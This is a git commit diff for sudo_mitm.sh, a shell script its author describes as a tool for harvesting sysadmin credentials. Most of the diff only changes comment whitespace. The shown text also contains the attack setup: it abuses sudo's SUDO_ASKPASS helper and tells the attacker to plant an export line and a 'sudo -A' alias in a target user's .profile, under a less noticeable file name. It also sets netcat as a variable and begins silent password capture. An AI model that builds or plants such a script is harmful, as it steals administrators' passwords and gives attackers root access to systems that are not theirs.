036566efef3fb06b9c6a02fb04f10d0555b6df4a
emptymonkey <pseudorandom@gmail.com>
2017-01-05 11:26:12 -0800

    Update sudo_mitm.sh

--- sudo_mitm.sh
+++ sudo_mitm.sh
@@ -2,17 +2,16 @@
 
 ################################################################################
 # sudo_mitm :	2013-03-20
-#	  emptymonkey's simple tool for harvesting sysadmin credentials.
+#  emptymonkey's simple tool for harvesting sysadmin credentials.
 #
 # From the sudoers man page:
-# askpass
-#   The askpass option specifies the fully qualified path to a helper program
-#	  used to read the user's password when no terminal is available. This may be
-#	  the case when sudo is executed from a graphical (as opposed to text-based)
-#	  application. The program specified by askpass should display the argument
-#	  passed to it as the prompt and write the user's password to the standard
-#	  output. The value of askpass may be overridden by the SUDO_ASKPASS
-#	  environment variable.
+#  The askpass option specifies the fully qualified path to a helper program
+#  used to read the user's password when no terminal is available. This may be
+#  the case when sudo is executed from a graphical (as opposed to text-based)
+#  application. The program specified by askpass should display the argument
+#  passed to it as the prompt and write the user's password to the standard
+#  output. The value of askpass may be overridden by the SUDO_ASKPASS
+#  environment variable.
 #
 # This script assumes you have the ability to write to the target users home
 # directory, specifically to their startup files. (e.g. ~/.profile)
@@ -27,8 +26,8 @@ NC=/bin/nc
 # Change the targets .profile to add these lines to point to this file.
 # (Also, you'll prolly want to rename it to something less obvious.)
 #
-#		export SUDO_ASKPASS="$HOME/.sudo_mitm.sh"
-#		alias sudo='sudo -A'
+#   export SUDO_ASKPASS="$HOME/.sudo_mitm.sh"
+#   alias sudo='sudo -A'
 
 TTY=`tty`
 stty -echo
